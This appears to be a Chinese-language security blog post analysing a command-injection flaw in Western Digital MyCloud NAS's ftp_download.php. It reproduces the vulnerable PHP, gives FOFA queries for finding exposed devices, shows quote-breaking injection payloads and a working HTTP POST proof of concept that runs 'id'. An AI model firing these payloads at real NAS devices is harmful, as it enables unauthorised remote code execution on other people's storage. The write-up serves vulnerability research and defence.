---
title: "西部数码 NAS ftp_download.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-ftp_download-rce.html
asset_dir: assets/西部数码-nas-ftp_download.php-命令执行漏洞
---

# 西部数码 NAS ftp\_download.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/11 12:11
- 615浏览
- [0评论](#comment)
- 2小时阅读

深入探索

授权

编程语言教程

SQL

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS ftp\_download.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞修复方案

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

防火墙软件

服务器安全服务

计算机安全

直接看 `ftp_download.php` 其业务实现逻辑如下

```
<?php
//session_start();
//$r = new stdClass();
//$r->success = false;
//
//include ("../lib/login_checker.php");
//
///* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
//if (login_check() == 0)
//{
//  echo json_encode($r);
//  exit;
//}

define('FTP_DOWNLOAD_CONF', '/var/www/xml/ftp_download.xml');

$action = $_POST['action'];
if ($action == "")
    $action = $_GET['action'];

function get_list()
{
    $r = new stdClass();
    $i = 0;
    if (file_exists(FTP_DOWNLOAD_CONF))
    {
       $xml = simplexml_load_file(FTP_DOWNLOAD_CONF);
       foreach ($xml->ftp_download->item as $item) {
          $pname = sprintf("/tmp/r_%s!_ftpdl", (string)$item->task_name);
          $bar_percent = "";
          $bar_running_sour = "";
          $bar_speed = "";
          if (file_exists($pname))
          {
             $_backup_info = file_get_contents($pname);
             $_backup_info_arr = explode("\n", $_backup_info);
             $bar_percent = $_backup_info_arr[0];
             if (count($_backup_info_arr) == 4)
             {              
                $bar_running_sour = $_backup_info_arr[1];
                $bar_speed = $_backup_info_arr[2];
             }
             else if (count($_backup_info_arr) == 3)
             {
                $bar_running_sour = $_backup_info_arr[1];
             }
             else
             {
                $bar_running_sour = "";
             }  
             //$bar_running_sour = rtrim($_backup_info_arr[1], "/");

             if ((string)$item->status == "0" && $bar_percent == "100") @unlink($pname);
          }
          if ((string)$item->status == "0") $bar_percent = "100";

          //Source dir
          $sour_list = array();
          foreach ($item->sour as $sitem)
             $sour_list[] = (string)$sitem;

          //Incremental List
          $incremental_list = array();
          if ((string)$item->backup_mode == "3") //Incremental mode
          {
             /*Get Backup list */
             $list_xml_file = sprintf("/tmp/r_%s!_ftpdl_imcremental.xml", (string)$item->task_name);
             $cmd = sprintf("ftp_download -a '%s' -o '%s' -c jobrs_list", (string)$item->task_name, $list_xml_file);
             pclose(popen($cmd, 'r'));

             if (file_exists($list_xml_file))
             {
                $list_xml = simplexml_load_file($list_xml_file);
                foreach ($list_xml->backup as $im_item)
                   $incremental_list[] = array((string)$im_item->task_name, (string)$im_item->time);
                @unlink($list_xml_file); 
             }
          }

          $r->rows[] = array(
             'id' => $i,
             'cell' => array(
                /* 0 */    (string)$item->task_name,
                /* 1 */    '',
                /* 2 */    $sour_list,
                /* 3 */    $percent_list,
                /* 4 */    (string)$item->dest,
                /* 5 */    (string)$item->status,
                /* 6 */    (string)$item->backup_direction,
                /* 7 */    (string)$item->backup_mode,
                /* 8 */    '', //Action: Start/Stop, Edit, Del, Detail
                /* 9 */(string)$item->finished_time,
                /* 10 */(string)$item->status,
                /* 11 */$bar_percent,
                /* 12 */$bar_running_sour,
                /* 13 */$incremental_list,
                /* 14 */(string)$item->update_routine,
                /* 15 */(string)$item->week_day,
                /* 16 */(string)$item->hour,
                /* 17 */(string)$item->host,
                /* 18 */(string)$item->host_user,
                /* 19 */(string)$item->host_passwd,
                /* 20 */(string)$item->lang,
                /* 21 */$bar_speed,
             )
          );
          $i++;
       } 
    }

    $r->page = 1;
    $r->total = $i;
    return $r;
}
function stop_job($taskname)
{
    //Stop job
    $cmd = sprintf("ftp_download -a '%s' -c jobstop >/dev/null 2>&1", $taskname);
    pclose(popen($cmd, 'r'));
    sleep(2);

    $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
    file_put_contents($pname, "-10"); //Cancel
}

$r = new stdClass();
switch ($action)
{
    case "create":
    {
       $taskname = $_POST['taskname'];       
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];       
       $schedule = $_POST['schedule'];
       $schedule_type = $_POST['backup_sch_type'];
       $hour = $_POST['hour'];
       $week = $_POST['week'];
       $day = $_POST['day'];

       $host = $_POST['host'];
       $user = $_POST['user'];
       $pwd = $_POST['pwd'];
       $lang = $_POST['lang'];

       $sch_command = "";
       if ($schedule  == "0")$sch_command = "0,1,1";
       else if ($schedule_type  == "3")$sch_command = "3,1,".$hour; //daily
       else if ($schedule_type  == "2")$sch_command = "2,".$week.",".$hour; //weekly
       else if ($schedule_type  == "1")$sch_command = "1,".$day.",".$hour; //monthly

       $cmd = sprintf("ftp_download -a \"%s\" -i \"%s\" -u \"%s\" -p \"%s\" -l \"%s\" -d \"%s\" -r %s -c jobadd",
                   $taskname, $host, $user, $pwd, $lang, $dest_dir, $sch_command);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s \"%s\"", $val);

               $cmd .= " >/dev/null 2>&1";
       system($cmd);
       //pclose(popen($cmd, 'r'));
       $pname = sprintf("/tmp/r_ftpdl!_%s", $taskname);
       @unlink($pname);

       stop_job($taskname);

       //Start job
       //$cmd = sprintf("(ftp_download -a '%s' -c jobrun >/dev/null 2>&1)&", $taskname);
       $cmd = sprintf("ftp_download -a '%s' -c jobrun > /dev/null 2>&1 &", $taskname);
                system($cmd);
//     pclose(popen($cmd, 'r'));
//     sleep(2);

       $r = get_list();
       $r->success = true;       
       echo json_encode($r);
    }
       break;

    case "modify":
    {
       $taskname = $_POST['taskname'];       
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];
       //$backup_type = $_POST['backup_type'];
       $old_taskname = $_POST['old_taskname'];       

       $schedule = $_POST['schedule'];
       $schedule_type = $_POST['backup_sch_type'];
       $hour = $_POST['hour'];
       $week = $_POST['week'];
       $day = $_POST['day'];

       $host = $_POST['host'];
       $user = $_POST['user'];
       $pwd = $_POST['pwd'];
       $lang = $_POST['lang'];

       $sch_command = "";
       if ($schedule  == "0")$sch_command = "0,1,1";
       else if ($schedule_type  == "3")$sch_command = "3,1,".$hour; //daily
       else if ($schedule_type  == "2")$sch_command = "2,".$week.",".$hour; //weekly
       else if ($schedule_type  == "1")$sch_command = "1,".$day.",".$hour; //monthly

       stop_job($taskname);

       $cmd = sprintf("ftp_download -a \"%s\" -x \"%s\" -i \"%s\" -u \"%s\" -p \"%s\" -l \"%s\" -d \"%s\" -r %s -c jobedit",
                   $taskname, $old_taskname, $host, $user, $pwd, $lang, $dest_dir, $sch_command);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s \"%s\"", $val);
            $cmd .= " >/dev/null 2>&1";
       system($cmd);  
       //pclose(popen($cmd, 'r'));

       //Start job
       //$cmdS = sprintf("ftp_download -a '%s' -c jobrun &", $taskname); 
       $cmdS = sprintf("ftp_download -a '%s' -c jobrun > /dev/null 2>&1 &", $taskname); 
            system($cmdS); 
       //pclose(popen($cmdS, 'r'));
       sleep(2);

       $r = get_list();
       $r->cmd = $cmd;
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "del":
    {
       $taskname = $_POST['taskname'];

       stop_job($taskname);

       $cmd = sprintf("ftp_download -a '%s' -c jobdel >/dev/null 2>&1", $taskname);
                system($cmd);
       //pclose(popen($cmd, 'r'));

       $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
       @unlink($pname);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "go_jobs":
    {
       $taskname = $_POST['taskname'];

       $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
       @unlink($pname);

       $cmd = sprintf("ftp_download -a '%s' -c jobrun &", $taskname);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "stop_jobs":
    {
       $taskname = $_POST['taskname'];

       stop_job($taskname);

       $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
       @unlink($pname);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "go_restore":
    {
       $taskname = $_POST['taskname'];

       stop_job($taskname);

       $pname = sprintf("/tmp/r_%s!_ftpdl", $taskname);
       file_put_contents($pname, "0"); //Cancel

       $list_xml_file = sprintf("/tmp/r_ftpdl!_restore_imcremental_%s.xml", $taskname);
       $cmd = sprintf("ftp_download -a '%s' -o '%s' -F %s -c jobrs &", $taskname, $list_xml_file, $_POST['restore_source']);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();      
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "get_list":
    {
       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

}
?>
```

多个功能（如创建、修改、删除任务）接收来自用户的 POST 参数，未经过滤或转义便直接使用 `sprintf` 拼接成操作系统命令，并由 `system()` 或 `pclose(popen())` 函数执行，导致攻击者可以[注入任意系统命令](https://mrxn.net/tag/rce)并获得远程代码执行能力。

漏洞修复方案

- **用户可控点：** 多个 `case` 分支中接收的 `$_POST` 参数，主要包括：
  - `action=create`: `taskname`, `host`, `user`, `pwd`, `dest_dir` 等
  - `action=modify`: `taskname`, `old_taskname`, `host`, `user`, `pwd`, `dest_dir` 等
  - `action=del`: `taskname`
  - `action=go_restore`: `taskname`, `restore_source`
- **参数的赋值处理：** 以 `action=create` 为例，用户可控的 `$taskname` 等变量被直接代入 `sprintf` 函数，用于构造命令字符串 `$cmd`。

```
$taskname = $_POST['taskname'];
// ... other $_POST variables
$cmd = sprintf("ftp_download -a \"%s\" -i \"%s\" -u \"%s\" -p \"%s\" -l \"%s\" -d \"%s\" -r %s -c jobadd",
                $taskname, $host, $user, $pwd, $lang, $dest_dir, $sch_command);
```

- **危险函数调用点：** 拼接好的命令字符串 `$cmd` 被直接传递给 `system()` 函数执行。

```
system($cmd);
```

在其他分支中，也存在 `pclose(popen($cmd, 'r'))` 的调用，同样会[执行命令](https://mrxn.net/tag/rce)。

- 代码中虽然对部分参数使用了双引号（`"`）或单引号（`'`）进行包裹，但这并不能有效阻止命令注入。攻击者可以通过注入命令分隔符（如 `;`, `|`, `&&`）来执行附加的恶意命令。
  - **双引号绕过：** 当参数被 `"` 包裹时，可注入 `";<command>;"`。例如，`taskname` 值为 `mytask";id;"`。
  - **单引号绕过：** 当参数被 `'` 包裹时，可注入 `a' ; <command> ; '`。例如，`taskname` 值为 `mytask' ; id ; '`。
  - **无引号：** 在 `go_restore` 功能中，`$_POST['restore_source']` 参数未被任何引号包裹，可以直接注入命令。
- **总结：** 无任何有效的输入过滤或转义机制，引号保护措施可被轻松绕过。

**action = "del" 分支 (单引号包裹，同样可注入):**

代码安全审计

```
case "del":
{
    $taskname = $_POST['taskname'];
    // ...
    $cmd = sprintf("ftp_download -a '%s' -c jobdel >/dev/null 2>&1", $taskname);
    system($cmd); // <-- 危险函数执行
    // ...
}
```

# 漏洞复现

```
POST /web/addons/ftp_download.php HTTP/1.1
Host: west.nas.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=create&taskname=";id;"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&schedule=0&lang=en
```

[![西部数码 NAS ftp_download.php 命令执行漏洞](images/img-001-61182b5722ba.webp)](https://image.mrxn.net/73f90041378a4a28b266d4a834998f16.webp)

成功[执行id命令](https://mrxn.net/tag/rce)并在响应里回显

代码安全审计

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
